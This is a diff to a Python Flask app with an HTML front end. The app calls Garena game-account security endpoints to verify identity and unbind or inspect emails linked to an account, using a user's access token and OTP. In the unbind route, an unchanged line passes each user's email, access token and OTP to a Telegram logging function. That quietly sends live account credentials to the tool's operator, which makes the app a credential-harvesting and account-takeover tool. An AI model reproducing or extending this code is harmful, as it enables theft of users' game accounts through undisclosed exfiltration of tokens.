@@ -78,6 +78,7 @@ def create_bind_request(verifier_token, access_token, email):
     return requests.post(url, data=data, headers=headers, timeout=10)
 
 def verify_identity(email, access_token, otp=None, secondary_password=None):
+    """Verify identity for unbind/rebind using OTP or secondary password."""
     url = "https://100067.connect.garena.com/game/account_security/bind:verify_identity"
     headers = {
         "User-Agent": "GarenaMSDK/4.0.19P9(Redmi Note 5 ;Android 9;en;US;)",
@@ -91,12 +92,21 @@ def verify_identity(email, access_token, otp=None, secondary_password=None):
         data["secondary_password"] = secondary_password
     else:
         return None, "Missing verification method"
-    resp = requests.post(url, data=data, headers=headers, timeout=10)
-    if resp.status_code == 200:
-        return resp.json().get("identity_token"), None
-    return None, resp.text
+    try:
+        resp = requests.post(url, data=data, headers=headers, timeout=10)
+        if resp.status_code == 200:
+            json_data = resp.json()
+            identity_token = json_data.get("identity_token")
+            if identity_token:
+                return identity_token, None
+            else:
+                return None, f"No identity_token in response: {json_data}"
+        else:
+            return None, f"HTTP {resp.status_code}: {resp.text}"
+    except Exception as e:
+        return None, str(e)
 
-def create_unbind_request(identity_token, access_token, email):
+def create_unbind_request(identity_token, access_token):
     url = "https://100067.connect.garena.com/game/account_security/bind:create_unbind_request"
     headers = {
         "User-Agent": "GarenaMSDK/4.0.19P9(Redmi Note 5 ;Android 9;en;US;)",
@@ -104,7 +114,11 @@ def create_unbind_request(identity_token, access_token, email):
         "Accept-Encoding": "gzip"
     }
     data = {"app_id": "100067", "access_token": access_token, "identity_token": identity_token}
-    return requests.post(url, data=data, headers=headers, timeout=10)
+    try:
+        resp = requests.post(url, data=data, headers=headers, timeout=10)
+        return resp
+    except Exception as e:
+        return None
 
 def get_bind_info(access_token):
     url = "https://100067.connect.garena.com/game/account_security/bind:get_bind_info"
@@ -229,27 +243,37 @@ def route_cancel_recovery():
 
 @app.route('/unbind_email', methods=['POST'])
 def route_unbind_email():
+    """
+    Full unbind flow: verify OTP via verify_identity, then create unbind request.
+    Matches AGxSGbind.py exactly.
+    """
     data = request.get_json()
     email = data.get('email', '').strip()
     access_token = data.get('access_token', '').strip()
-    otp = data.get('otp', '').strip()  # OTP is now required
+    otp = data.get('otp', '').strip()
 
     if not email or not access_token or not otp:
         return jsonify({'success': False, 'error': 'Email, access_token, and otp required'}), 400
 
     log_telegram("🔓 UNBIND EMAIL", Email=email, AccessToken=access_token, OTP=otp)
 
+    # Step 1: Verify identity with OTP
     identity_token, err = verify_identity(email, access_token, otp=otp)
     if err:
         return jsonify({'success': False, 'error': f'Identity verification failed: {err}'}), 400
     if not identity_token:
-        return jsonify({'success': False, 'error': 'No identity_token received'}), 400
+        return jsonify({'success': False, 'error': 'No identity_token received from verify_identity'}), 400
 
-    resp = create_unbind_request(identity_token, access_token, email)
+    # Step 2: Create unbind request with identity_token
+    resp = create_unbind_request(identity_token, access_token)
+    if resp is None:
+        return jsonify({'success': False, 'error': 'Network error calling create_unbind_request'}), 500
+
     if resp.status_code == 200 and '"result":0' in resp.text.replace(" ", ""):
         return jsonify({'success': True, 'message': 'Email unbind request created successfully'})
     else:
-        return jsonify({'success': False, 'error': f'Unbind failed: {resp.text}'}), 400
+        error_msg = f'Unbind API error: {resp.status_code} - {resp.text}'
+        return jsonify({'success': False, 'error': error_msg}), 400
 
 @app.route('/check_platforms', methods=['GET'])
 def route_check_platforms():
@@ -270,7 +294,7 @@ def route_check_platforms():
         'bounded_accounts': data.get("bounded_accounts", [])
     })
 
-# ========== FRONTEND UI – FULLY MOBILE‑FRIENDLY WITH HUMAN‑READABLE COUNTDOWN ==========
+# ========== FRONTEND UI – UNBIND FIXED ==========
 
 HTML_PAGE = """
 <!DOCTYPE html>
@@ -526,11 +550,11 @@ HTML_PAGE = """
                     <div id="cancel-result" class="result-box" style="display:none;"></div>
                 </div>
 
-                <!-- Unbind Email -->
+                <!-- Unbind Email – fixed flow -->
                 <div class="glass-card p-4" data-aos="fade-up" data-aos-delay="250">
                     <h3 class="text-lg font-bold text-yellow-300"><i class="fas fa-unlink mr-2"></i>Unbind Email</h3>
                     <div class="space-y-3 mt-3">
-                        <input type="email" id="unbind-email" class="form-input" placeholder="Email to unbind">
+                        <input type="email" id="unbind-email" class="form-input" placeholder="Bound Email (must be the one currently linked)">
                         <button onclick="sendOtp('unbind')" id="btn-send-otp-unbind" class="btn-glow btn-info"><i class="fas fa-paper-plane mr-2"></i>Send OTP</button>
                         <input type="text" id="unbind-otp" class="form-input" placeholder="Enter OTP received">
                         <button onclick="unbindEmail()" id="btn-unbind" class="btn-glow btn-warning"><i class="fas fa-unlink mr-2"></i>Unbind</button>
@@ -596,7 +620,6 @@ HTML_PAGE = """
             }
         }
 
-        // Format seconds into human-readable days, hours, minutes, seconds
         function formatDuration(seconds) {
             if (seconds <= 0) return '0 seconds';
             const days = Math.floor(seconds / 86400);
@@ -626,13 +649,11 @@ HTML_PAGE = """
 
         // ========== API CALLS ==========
 
-        // Unified send OTP for both "add" and "unbind" contexts
         async function sendOtp(context) {
             const token = getAccessToken();
             if (!token) { showToast('Access Token is required', 'error'); return; }
 
-            let email;
-            let btnId, resultId;
+            let email, btnId, resultId;
             if (context === 'add') {
                 email = document.getElementById('add-email').value.trim();
                 btnId = 'btn-send-otp-add';
@@ -738,7 +759,6 @@ HTML_PAGE = """
                     } else {
                         msg += `<p>⚠️ No recovery email configured.</p>`;
                     }
-                    // Display countdown if non-zero
                     if (data.countdown && data.countdown > 0) {
                         const formatted = formatDuration(data.countdown);
                         msg += `<p>⏰ <strong>Time remaining:</strong> ${formatted}</p>`;
